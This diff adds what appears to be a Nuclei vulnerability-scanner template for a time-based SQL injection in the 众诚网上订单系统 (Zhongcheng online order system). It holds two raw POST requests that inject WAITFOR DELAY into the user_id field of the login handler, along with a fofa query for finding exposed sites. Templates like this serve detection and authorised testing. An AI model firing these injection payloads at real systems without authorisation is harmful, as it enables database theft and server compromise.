@@ -1,0 +1,33 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_1>=4 && duration_1<=5
+            - duration_2>=8 && duration_2<=9
+          type: dsl
+      raw:
+        - |
+          POST /ajax/o_sa_order.ashx HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+          type=login&user_id=1%27);WAITFOR%20DELAY%20%270:0:4%27--&user_pwd=1
+        - |
+          POST /ajax/o_sa_order.ashx HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+          type=login&user_id=1%27);WAITFOR%20DELAY%20%270:0:8%27--&user_pwd=1
+id: zhongcheng-o_sa_order_ashx-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: title="众诚网上订单系统"
+        众诚网上订单系统 o_sa_order.ashx 存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 众诚网上订单系统 o_sa_order.ashx SQL延时注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487140&idx=1&sn=512ac11ada345ca2053390419d0f90b4&chksm=c267bb97f5103281f89ce1566e8dd389bfeedcfaced56bb568f9fa53e8096b0c5a95814f64ec&token=101124693&lang=zh_CN#rd
+    severity: high
+    tags: []
